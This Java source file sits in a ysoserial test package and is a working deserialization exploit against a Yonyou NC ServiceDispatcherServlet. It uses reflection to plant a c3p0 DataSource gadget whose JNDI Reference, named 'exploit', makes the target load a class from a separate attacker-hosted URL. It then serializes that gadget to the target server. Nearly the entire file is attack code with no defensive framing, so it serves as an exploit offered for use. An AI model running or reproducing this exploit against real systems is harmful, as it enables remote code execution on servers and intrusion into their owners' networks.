package ysoserial.test;

import com.mchange.v2.c3p0.WrapperConnectionPoolDataSource;
import com.mchange.v2.c3p0.impl.WrapperConnectionPoolDataSourceBase;
import nc.bs.framework.common.Profiler;
import nc.bs.framework.comn.Result;
import nc.bs.framework.exception.ConnectorException;
import nc.bs.framework.exception.ConnectorFailException;
import nc.bs.framework.exception.ConnectorIOException;
import nc.bs.framework.rmi.*;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.Referenceable;
import javax.sql.DataSource;
import javax.sql.PooledConnection;
import java.io.*;
import java.lang.reflect.Field;
import java.net.*;
import java.sql.Connection;
import java.sql.SQLException;
import java.sql.SQLFeatureNotSupportedException;
import java.util.HashMap;
import java.util.logging.Logger;

public class test1 {
    private static final class PoolSource implements DataSource, Referenceable {

        private String className;
        private String url;

        public PoolSource ( String className, String url ) {
            this.className = className;
            this.url = url;
        }

        public Reference getReference () throws NamingException {
            return new Reference("exploit", this.className, this.url);
        }

        public PrintWriter getLogWriter () throws SQLException {return null;}
        public void setLogWriter ( PrintWriter out ) throws SQLException {}
        public void setLoginTimeout ( int seconds ) throws SQLException {}
        public int getLoginTimeout () throws SQLException {return 0;}
        public Logger getParentLogger () throws SQLFeatureNotSupportedException {return null;}
        public PooledConnection getPooledConnection () throws SQLException {return null;}
        public PooledConnection getPooledConnection ( String user, String password ) throws SQLException {return null;}

        @Override
        public Connection getConnection() throws SQLException {
            return null;
        }

        @Override
        public Connection getConnection(String username, String password) throws SQLException {
            return null;
        }

        @Override
        public <T> T unwrap(Class<T> iface) throws SQLException {
            return null;
        }

        @Override
        public boolean isWrapperFor(Class<?> iface) throws SQLException {
            return false;
        }
    }

    static class SilentURLStreamHandler extends URLStreamHandler {

        protected URLConnection openConnection(URL u) throws IOException {
            return null;
        }

        protected synchronized InetAddress getHostAddress(URL u) {
            return null;
        }
    }

    public static void main(String[] args) throws Throwable {
        WrapperConnectionPoolDataSourceBase poolBackedDataSourceBase = new WrapperConnectionPoolDataSource(false);
        Class cls = poolBackedDataSourceBase.getClass().getSuperclass();
        Field field = cls.getDeclaredField("nestedDataSource");
        field.setAccessible(true);
        field.set(poolBackedDataSourceBase,new PoolSource("exp","http://192.168.120.31:8990/"));

        Address target = new Address("http://192.168.120.25:9991/ServiceDispatcherServlet");
        RemoteChannelFactory rcf = RemoteChannelFactoryManager.getDefault().getRemoteChannelFactory(target.getProtocol());
        if (rcf == null) {
            throw new ConnectorException("not support target address:" + target);
        } else {
            RemoteChannel rc = null;
            Result ret = null;

            Object var19;
            try {

                rc = rcf.createRemoteChannel(target);

                rc.init();
                RemoteUtil.writeObject(rc.getOutputStream(), poolBackedDataSourceBase);
                ret = (Result)RemoteUtil.readObject(rc.getInputStream(), (boolean[])null);
                if (ret.appexception != null) {
                    throw ret.appexception;
                }

                var19 = ret.result;
            }  finally {
                if (rc != null) {
                    rc.destroy();
                }
            }

        }

    }
}